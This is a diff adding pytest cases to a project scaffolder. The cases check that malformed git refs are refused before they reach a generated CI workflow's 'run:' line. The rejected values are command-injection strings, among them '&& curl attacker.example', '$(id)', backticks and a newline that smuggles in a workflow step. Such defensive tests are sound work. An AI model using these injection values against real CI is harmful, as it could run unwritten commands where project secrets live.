@@ -279,6 +279,39 @@ def test_generated_ci_pins_kicad_to_the_confirmed_version(tmp_path):
     assert f"container: {scaffold.KICAD_IMAGE}" in workflow
 
 
+@pytest.mark.parametrize(
+    "ref",
+    [
+        "main pcbkit doctor; echo PWNED",
+        "main && curl attacker.example",
+        "main\nrun: echo hi",
+        "$(id)",
+        "`id`",
+        "main | tee /tmp/x",
+        "-upstream",
+        "a..b",
+        "refs/heads/x.lock",
+        "",
+    ],
+)
+def test_a_ref_that_is_not_a_ref_is_refused(ref, tmp_path):
+    """The ref lands in a `run:` line of the generated workflow. A value that
+    is not a ref would put a command there that nobody wrote as one, in CI that
+    holds the project's secrets."""
+    envelope = new_project(tmp_path / "demo", pcbkit_ref=ref)
+    assert not envelope.ok
+    assert "invalid pcbkit ref" in envelope.errors[0]
+    # And nothing is left half-written.
+    assert not (tmp_path / "demo" / ".github").exists()
+
+
+@pytest.mark.parametrize(
+    "ref", ["main", "v1.2.3", "0123456789abcdef0123456789abcdef01234567", "release/1.x"]
+)
+def test_ordinary_refs_are_accepted(ref, tmp_path):
+    assert new_project(tmp_path / ref.replace("/", "-"), name="demo", pcbkit_ref=ref).ok
+
+
 def test_the_default_pcbkit_ref_is_one_that_resolves():
     """A workflow whose first step cannot install pcbkit is a gate that can
     never pass -- the same failure as naming a verb that does not exist.
